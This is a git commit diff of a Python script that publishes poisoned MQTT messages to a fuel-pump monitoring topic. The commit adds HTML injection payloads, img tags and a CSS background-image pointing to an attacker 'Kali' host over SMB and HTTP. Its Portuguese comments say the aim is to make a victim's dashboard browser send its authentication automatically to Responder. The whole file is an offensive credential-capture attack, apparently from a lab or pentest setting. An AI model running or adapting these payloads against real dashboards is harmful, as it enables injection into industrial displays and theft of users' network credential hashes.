8c4162685e9b7b974c113b357eaf04d57aa9134e
Alef Santos <167534821+alefkaue@users.noreply.github.com>
2026-06-07 02:46:32 -0300

    Update injetar_av.py

--- injetar_av.py
+++ injetar_av.py
@@ -8,17 +8,19 @@ KALI_IP = "10.10.100.8"
 client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
 client.connect(BROKER, 1883, 60)
 
+# Injetando tags HTML simulando imagens ou links de recursos no seu Kali
+# Se o navegador da vítima (.3 ou .2) interpretar isso na tela, ele disparará a autenticação HTTP/SMB automática
 payload = {
     "pumpId": "PUMP001",
-    "location": rf"\\{KALI_IP}\share\local",
-    "fuelType": "Diesel S-10",
+    "location": f"<img src='\\\\{KALI_IP}\\share\\logo.png'>Terminal Leste",
+    "fuelType": f"<img src='http://{KALI_IP}/image.gif'>Diesel S-10",
     "capacityCurrent": 4500,
     "capacityTotal": 5000,
     "capacityPercentage": "90.0",
-    "status": rf"\\{KALI_IP}\share\status",
+    "status": f"<b style='background-image:url(\\\\{KALI_IP}\\\\test)'>Normal</b>",
     "timestamp": int(time.time() * 1000)
 }
 
 client.publish("fuel-pumps/data", json.dumps(payload))
-print("[+] Variante 1 enviada. Olhe o painel /ui e monitore o Responder!")
+print("[+] Payload HTML envenenado enviado. Monitore o Responder!")
 client.disconnect()
